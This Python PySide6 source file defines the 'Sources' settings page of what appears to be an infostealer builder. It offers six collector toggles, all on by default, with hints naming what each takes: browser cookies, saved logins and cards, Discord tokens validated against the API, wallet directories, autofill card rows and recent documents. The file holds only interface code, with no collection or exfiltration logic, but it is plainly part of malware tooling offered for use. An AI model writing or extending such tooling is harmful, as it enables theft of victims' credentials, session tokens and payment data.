"""Sources page: six toggles bound to ``SourceConfig``.

One checkbox per field in ``SourceConfig``, taken from that dataclass rather than
written out here, so a field added to the schema appears without this file changing.
The labels come from ``app.worker.SOURCE_LABELS`` because the worker is what turns the
page's values into a config and the two must agree on the names.

Each toggle carries its own one-line description underneath. A row that says only
"Sessions" makes the reader guess what leaves the machine, and a settings screen that
needs a manual is not a settings screen.

The page reports and never enforces. "Every source is switched off" is
``core.validate``'s rule, and it says so against the dotted path ``sources``.
"""

from __future__ import annotations

from typing import Final

from PySide6.QtWidgets import QCheckBox, QGridLayout, QLabel, QVBoxLayout, QWidget

from core.schema import SOURCE_FIELDS

from ..widgets.field import Card
from ..worker import SOURCE_LABELS

__all__ = ["SourcesPage"]

_LABELS: Final[dict[str, str]] = dict(SOURCE_LABELS)

_HINTS: Final[dict[str, str]] = {
    "system": "UUID, CPU, GPU, memory, uptime, OS build, machine and user name.",
    "browsers": "Profiles, cookies, logins, cards, history, downloads and the profile folder.",
    "sessions": "Discord tokens from the browser store and the desktop client, checked against the API.",
    "wallets": "Wallet directories, names and sizes. No key material is read.",
    "autofill": "Address and card rows from the Chromium autofill tables.",
    "documents": "Recent-document lists from the user registry hives.",
}

_COLUMNS: Final[int] = 2


class SourcesPage(QWidget):
    """One checkbox per ``SourceConfig`` field."""

    title: Final[str] = "Sources"
    description: Final[str] = "What the agent collects when it runs."

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)

        self._boxes: dict[str, QCheckBox] = {}

        card = Card(
            "Collectors",
            "All six are on by default. Every one that is switched off is work the run "
            "does not do and a section the archive does not carry.",
        )

        grid = QGridLayout()
        grid.setContentsMargins(0, 0, 0, 0)
        grid.setHorizontalSpacing(28)
        grid.setVerticalSpacing(16)

        for index, name in enumerate(SOURCE_FIELDS):
            box = QCheckBox(_LABELS.get(name, name))
            box.setObjectName("sourceToggle")
            box.setChecked(True)
            if name in _HINTS:
                # The tooltip stays as well: it is what a hover shows when the row is
                # narrow enough that the description underneath is elided.
                box.setToolTip(_HINTS[name])
            self._boxes[name] = box

            row = QWidget()
            row.setObjectName("sourceRow")
            column = QVBoxLayout(row)
            column.setContentsMargins(0, 0, 0, 0)
            column.setSpacing(2)
            column.addWidget(box)
            hint = QLabel(_HINTS.get(name, ""))
            hint.setObjectName("sourceHint")
            hint.setWordWrap(True)
            column.addWidget(hint)

            grid.addWidget(row, index // _COLUMNS, index % _COLUMNS)

        grid.setColumnStretch(0, 1)
        grid.setColumnStretch(1, 1)
        card.add_row(grid)

        column = QVBoxLayout(self)
        column.setContentsMargins(0, 0, 0, 0)
        column.setSpacing(18)
        column.addWidget(card)
        column.addStretch(1)

    # --- value ---------------------------------------------------------------

    def values(self) -> dict[str, bool]:
        return {name: box.isChecked() for name, box in self._boxes.items()}

    def enabled_count(self) -> int:
        return sum(1 for box in self._boxes.values() if box.isChecked())

    def reset(self) -> None:
        for box in self._boxes.values():
            box.setChecked(True)

    # --- state ---------------------------------------------------------------

    def show_problems(self, problems) -> None:
        """There is no per-source field to paint; the shell shows the message."""
        return
